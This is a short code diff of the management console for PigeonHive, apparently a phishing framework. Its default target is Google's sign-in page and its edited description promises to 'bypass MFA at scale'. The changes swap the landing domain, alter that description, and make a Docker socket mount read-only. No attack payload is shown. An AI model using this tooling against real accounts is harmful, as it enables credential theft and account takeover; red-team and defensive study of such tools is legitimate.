@@ -45,7 +45,7 @@ caddy_volume_name = 'caddy_data'
 
 # default url to be used for phishing
 default_target = 'https://accounts.google.com/signin'
-default_landing = 'pigeonhive.local'
+default_landing = 'localhost'
 
 # ---------------
 
@@ -60,7 +60,7 @@ def main():
         exit(1)
 
     # initialize argument parser and create subparsers to hand subcommands
-    parser = argparse.ArgumentParser(description='Management console for PigeonHive')
+    parser = argparse.ArgumentParser(description='Management console for PigeonHive - bypass MFA at scale!')
     parser.set_defaults(func=default_output)
     subparsers = parser.add_subparsers(title='subcommands', help='Select a general action to take')
     
@@ -169,7 +169,7 @@ def do_caddy():
             endpoint_spec=docker.types.EndpointSpec(ports={80: 80, 443: 443}),
             constraints=['node.labels.pigeonhive_leader == true'],
             mounts=[
-                '/var/run/docker.sock:/var/run/docker.sock:rw',
+                '/var/run/docker.sock:/var/run/docker.sock:ro',
                 f'{caddy_container_name}:/data'
                 ]
         )
